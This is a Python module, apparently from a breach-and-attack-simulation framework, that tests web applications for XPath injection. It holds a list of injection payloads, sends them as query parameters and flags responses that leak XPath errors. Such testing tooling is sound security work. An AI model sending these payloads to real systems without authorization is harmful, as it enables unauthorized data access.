"""XPath Injection testing. MITRE ATT&CK: T1190"""
from __future__ import annotations
import uuid
from typing import Any
from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus

DEFAULT_XPATH_PAYLOADS = [
    "' or '1'='1", "' or ''='", "x' or 1=1 or 'x'='y", "') or ('1'='1",
    "1 or 1=1", "' or 1=1]%00", "admin' or '1'='1", "' or count(//*)>0 or '1'='1",
    "' or string-length(name(/*))>0 or '1'='1", "'] | //user/*[contains(.,''",
]

class XPathiModule(BaseAttackModule):
    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(name="xpathi", description="XPath injection testing", category="xpath",
            mitre_technique_ids=["T1190"], mitre_technique_names=["Exploit Public-Facing Application"],
            auth_level_required=AuthorizationLevel.LOW_IMPACT, owasp_category="A03:2021 - Injection",
            cwe_ids=["CWE-643"], tags=["injection", "xpath", "xml"])

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        return DEFAULT_XPATH_PAYLOADS

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        params = options.get("params", ["username", "user", "name", "search", "query"])
        return [AttackRequest(request_id=f"xpath-{uuid.uuid4().hex[:8]}", target=target, method="GET",
            path=options.get("path", "/"), params={param: p}) for p in payloads for param in params[:3]]

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text.lower()
        if any(k in body for k in ["xpath", "xmldomerror", "invalid expression", "simplexml"]):
            return ModuleResult(module_name="xpathi", target=request.target, status=VulnStatus.POTENTIALLY_VULNERABLE,
                payload_used=payload, response_code=response.status_code, response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms, evidence="XPath error exposed in response",
                severity="high", mitre_technique_id="T1190")
        return ModuleResult(module_name="xpathi", target=request.target, status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload, response_code=response.status_code, elapsed_ms=response.elapsed_ms)
